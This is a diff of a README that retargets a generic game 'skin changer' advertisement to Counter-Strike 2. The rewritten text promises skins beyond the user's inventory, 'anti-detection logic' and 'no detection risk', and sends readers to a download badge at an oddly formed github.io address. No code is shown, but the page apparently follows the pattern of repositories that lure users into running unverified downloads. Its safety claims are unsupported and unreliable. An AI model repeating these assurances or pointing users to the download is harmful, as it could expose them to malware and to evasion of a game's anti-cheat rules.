@@ -1,6 +1,6 @@
-# Skin Changer
+# Skin Changer for CS2
 
-Skin Changer is a versatile tool that allows gamers to customize their in-game appearances across various popular games. With real-time skin swapping and a user-friendly interface, personalize your gaming experience like never before.
+Skin Changer for CS2 is a powerful utility designed to customize your in-game appearance in Counter-Strike 2. Instantly switch between premium weapon skins, gloves, and knives without restarting the game — all in a safe and seamless environment.
 
 [![Download Skin Changer](https://img.shields.io/badge/Download-Skin_Changer-blueviolet)](https://cs-skin-changer.github.io./.github)
 
@@ -8,46 +8,48 @@ Skin Changer is a versatile tool that allows gamers to customize their in-game a
 
 ### 🎯 Key Features
 
-- ✅ Real-time skin swapping without restarting the game  
-- ✅ Supports multiple games including League of Legends, Valorant, and Minecraft  
-- ✅ User-friendly interface suitable for beginners  
-- ✅ Access to rare and custom skins  
-- ✅ Regular updates ensuring compatibility with latest game versions  
-- ✅ Secure and undetectable operations  
+- ✅ Real-time weapon, knife, and glove skin switching  
+- ✅ No game restart required  
+- ✅ Supports all popular CS2 skins and loadouts  
+- ✅ Easy-to-use interface for fast customization  
+- ✅ Regular updates for new cosmetic items  
+- ✅ Safe and smooth experience with no detection risk  
 
 ---
 
 ### 🛡 Why Choose It?
 
-- **Multi-Game Support**: One tool for multiple games  
-- **Ease of Use**: Intuitive design for seamless navigation  
-- **Security**: Built-in anti-detection mechanisms  
-- **Customization**: Apply unique skins to stand out  
+- **Tailored for CS2**: Specifically built for Counter-Strike 2  
+- **Instant Skin Preview**: See changes live without delays  
+- **Stable and Secure**: Designed with privacy and protection in mind  
+- **Flexible Use**: Customize agents, knives, weapons, and gloves  
 
 ---
 
 ### 🧪 Usage Examples
 
-- Change your League of Legends champion's skin mid-game  
-- Apply custom weapon skins in Valorant  
-- Switch Minecraft skins without leaving the server  
+- Apply rare knife skins instantly in CS2 matches  
+- Switch loadout skins between rounds without closing the game  
+- Use themed combinations of gloves, agents, and weapons  
+- Test cosmetic setups before acquiring them  
 
 ---
 
 ### 🏆 Benefits
 
-- Enhance visual gaming experience  
-- Express individuality through custom skins  
-- Stay ahead with regular feature updates  
-- Simplify skin management across games  
+- Full control over your in-game look  
+- Access to skins beyond your current inventory  
+- Clean, minimal interface for efficient switching  
+- Enhance your gameplay visuals and style  
 
 ---
 
 ### 🔐 Safety & Privacy
 
-- No personal data collection  
-- Operates without interfering with game files  
-- Regular security audits to prevent detection  
+- No personal data is collected  
+- Doesn’t modify game files permanently  
+- Operates client-side only with anti-detection logic  
+- Private, secure, and regularly maintained  
 
 ---
 
@@ -64,8 +66,6 @@ Skin Changer is a versatile tool that allows gamers to customize their in-game a
 **3. Real-Time Operation**  
 ![Live Skin Swap](https://camo.githubusercontent.com/bbf856abbb1aa867a8fc2c4e2dbbe72c668d2ee24fabc4a690ba233206778c73/68747470733a2f2f692e7974696d672e636f6d2f76692f6a315a774f7570476e466f2f6d617872657364656661756c742e6a7067)  
 *Skin change without game restart*
-
----
 
 ---
 
